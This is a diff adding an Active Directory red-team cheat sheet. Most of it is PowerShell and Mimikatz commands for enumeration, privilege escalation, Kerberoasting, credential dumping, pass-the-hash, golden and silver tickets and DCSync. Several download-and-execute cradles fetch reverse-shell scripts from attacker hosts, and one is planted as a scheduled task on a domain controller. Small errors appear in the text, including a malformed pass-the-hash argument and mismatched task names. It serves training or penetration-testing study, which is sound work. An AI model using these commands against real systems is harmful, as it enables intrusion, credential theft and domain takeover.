@@ -1,0 +1,286 @@
+## 1. Internal Infrastructure Overview
+
+### 1.1 Infrastructure Enumeration
+- Focus on mapping networking devices and hosts in the internal environment
+- Attackers leverage built-in tools to enumerate and map live hosts
+- Internal networks typically comprise Active Directory environments, which can be abused through misconfigurations
+- Tools used include:
+  - nmap
+  - netcat
+  - PowerShell
+
+#### PowerShell Port Scanning Examples:
+```powershell
+# Scan ports 1-1024 on a specific host
+1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null
+
+# Scan specific ports across multiple IPs
+1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a",$_)) "Port $_ is open!"} 2>$null}
+```
+
+### 1.2 Active Directory Essentials
+- Example environment: 3 machines in a domain setup
+  - 10.10.10.2 - Domain Controller
+  - 10.10.10.3 - Application Server
+  - 10.10.10.4 - Employee System
+
+#### PowerShell for Red Teaming
+- .NET interpreter installed by default on all Windows versions
+- Executes binaries and scripts completely in-memory
+- Provides access to manage Active Directory
+- Useful for lateral movement scenarios
+
+#### PowerShell Module Usage:
+```powershell
+# Import a module
+Import-Module <Module_Name.ps1>
+
+# Dot sourcing a script
+. .\<Script_Name>.ps1
+```
+
+#### PowerShell In-Memory Download and Execute Techniques:
+```powershell
+# Method 1
+$down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1")
+$read = $down.GetResponse()
+IEX ([System.IO.StreamReader]($read.GetResponseStream())).ReadToEnd()
+
+# Method 2
+iex (iwr 'http://192.168.2.2/file.ps1')
+
+# Method 3
+$file=New-Object -ComObject Msxml2.XMLHTTP
+$file.open('GET','http://192.168.2.2/file.ps1',$false)
+$file.send()
+iex $file.responseText
+
+# Method 4
+$ie=New-Object -ComObject InternetExplorer.Application
+$ie.visible=$False
+$ie.navigate('http://192.168.2.2/reverse.ps1')
+sleep 5
+$response=$ie.Document.body.innerHTML
+$ie.quit()
+iex $response
+
+# Method 5
+iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')
+```
+
+## 2. Active Directory Phases Exploitation
+
+### 2.1 Domain Enumeration with PowerView
+
+```powershell
+# Get current domain
+Get-NetDomain
+Get-NetDomain -Domain cyberwarfare.corp
+
+# Retrieve Current SID and Domain Controller
+Get-NetDomainController -Domain cyberwarfare.corp
+Get-DomainSID
+
+# Retrieve users in the current domain
+Get-NetUser
+Get-NetUser -UserName emp1
+
+# Retrieve computers in the current domain
+Get-NetComputer
+Get-NetComputer -FullData
+Get-NetComputer -OperatingSystem "Windows Server 2016 Standard"
+
+# List domain groups
+Get-NetGroup
+Get-NetGroup -FullData
+Get-NetGroup -Domain cyberwarfare.corp
+
+# Enumerate privileged group members
+Get-NetGroupMember -GroupName "Domain Admins" -verbose
+Get-NetLocalGroup -ComputerName DC-01 -ListGroups
+
+# ACL Enumeration
+Get-ObjectAcl -SamAccountName <Domain_User> -ResolveGUIDs
+Invoke-ACLScanner -ResolveGUIDs
+
+# Enumerate Domain Trusts
+Get-NetDomainTrust
+Get-NetDomainTrust -Domain cyberwarfare.corp
+
+# Enumerate Forest domains
+Get-NetForestDomain -Verbose
+Get-NetForest -Verbose
+
+# Find computer sessions where current user has local admin access
+Find-LocalAdminAccess -Verbose
+```
+
+### 2.2 Local Privilege Escalation
+
+Common techniques include:
+- Abuse Elevation Control Mechanism [T1548]
+- Access Token Manipulation [T1134]
+- Boot or Logon Auto-start Execution [T1547]
+- Boot or Logon Initialization Scripts [T1037]
+- Create or Modify System Process [T1543]
+- Event Triggered Execution [T1546]
+- Exploitation for Privilege Escalation [T1068]
+- Process Injection [T1055]
+- Scheduled Task/Job [T1053]
+- Valid Accounts [T1078]
+
+#### Using PowerUp for privilege escalation:
+```powershell
+. .\PowerUP.ps1
+Invoke-AllChecks -Verbose
+
+# List services which can be configured
+Get-ModifiableService -Verbose
+
+# Find Unquoted Service Paths
+Get-ServiceUnquoted -Verbose
+```
+
+### 2.3 Admin Reconnaissance
+
+- Adversaries seek to locate machines where admin users are logged in
+- Service accounts often have administrator privileges
+- Kerberoasting can be used to brute-force service account credentials
+- "Invoke-UserHunter" can locate sessions with high-privilege domain users
+
+#### Kerberoasting Attack
+- Process:
+  1. Request a TGT from DC
+  2. Use TGT to get a TGS for target service
+  3. Export TGS (encrypted with target service account hash)
+  4. Brute-force the hash offline against a password dictionary
+
+```powershell
+# Find user accounts used as service accounts
+Get-NetUser -SPN
+
+# Request service tickets
+Request-SPNTicket
+
+# Check tickets in memory
+klist
+
+# Export tickets using Mimikatz
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+# Crack the password (using external tools)
+python.exe .\tgsrepcrack.py .\passwords.txt '.\Ticket.kirbi'
+```
+
+### 2.4 Lateral Movement
+
+Techniques include:
+- PowerShell Remoting
+- Windows Management Instrumentation (WMI)
+- Mimikatz
+
+#### PowerShell Remoting
+- Uses WinRM protocol on TCP ports 5985 (HTTP) and 5986 (HTTPS)
+- Enabled by default from Windows Server 2012
+- Used to remotely execute commands
+
+```powershell
+# Enable PS Remoting
+Enable-PSRemoting -SkipNetworkProfileCheck -Verbose -Force
+
+# Create and use sessions
+$session = New-PSSession -Computername Windows-Server
+Invoke-Command -Session $session -ScriptBlock {Whoami;hostname}
+Enter-Pssession -Session $session -verbose
+```
+
+#### Mimikatz PowerShell
+```powershell
+# Dump credentials
+Invoke-Mimikatz -DumpCreds -Verbose
+Invoke-Mimikatz -DumpCreds -ComputerName @("comp1","comp2")
+
+# Pass-the-hash attack
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:cyberwarfare.corp/hash: /run:powershell.exe"'
+```
+
+#### Unconstrained Delegation Attack
+- When unconstrained delegation is enabled, user's TGT is stored in memory on the server
+- Adversaries can extract and reuse these TGTs
+
+```powershell
+# List computers with unconstrained delegation
+Get-NetComputer -unconstrained -verbose
+
+# Extract TGTs
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+# Reuse tickets
+Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
+
+# Run DCSYNC attack
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"'
+```
+
+### 2.5 Persistence & Data Exfiltration
+
+Exfiltration techniques:
+- Automated Exfiltration [T1020]
+- Exfiltration Over Alternative Protocol [T1048]
+- Exfiltration Over Physical Medium [T1052]
+- Transfer Data to Cloud Account [T1537]
+
+#### Golden Ticket Attack
+- Uses the krbtgt account hash to impersonate any user with any privileges
+- Requirements:
+  - Domain SID
+  - krbtgt hash
+  - Domain name
+  - SIDs (for cross-forest attacks)
+
+```powershell
+# Extract krbtgt hash
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"'
+
+# Get Domain SID
+whoami /all
+
+# Create Golden Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-xxxxx-yyyyy-xxxxx /krbtgt:xxxxxxxxxxxxxxxxxx /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+```
+
+#### Silver Ticket Attack
+- Creates a forged TGS for specific services
+- Uses service account/machine account hash
+- Requirements:
+  - Domain SID
+  - Service/Machine account hash
+  - Domain name
+
+```powershell
+# Extract machine account hash
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\dc-01$"'
+
+# Create Silver Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-yyyyyyyy-zzzzzzzzzz-xxxxxx /target:enterprise-dc.cyberwarfare.corp /service:cifs /rc4:<HASH> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+# Execute commands with Silver Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-xxxxxx-yyyy-zzzzz /target:exterprise-dc.cyberwarfare.corp /service:HOST /rc4:xxxxx /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+# Create malicious task
+schtasks /create /S enterprise-dc.cyberwarfare.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "lateral" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.1:8000/Invoke-PowerShellTcp.ps1''')'"
+
+# Run the task
+schtasks /Run /S enterprise-dc.cyberwarfare.corp /TN "STCheck"
+```
+
+#### DCSYNC Attack
+- Extracts domain credentials without code execution on the Domain Controller
+- Requires specific privileges:
+  - Get-ReplicationChanges
+  - Get-ReplicationChangesAll
+  - Get-ReplicationChanges-in-a-filtered-set
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:cyberwarfare\krbtgt"'
+```
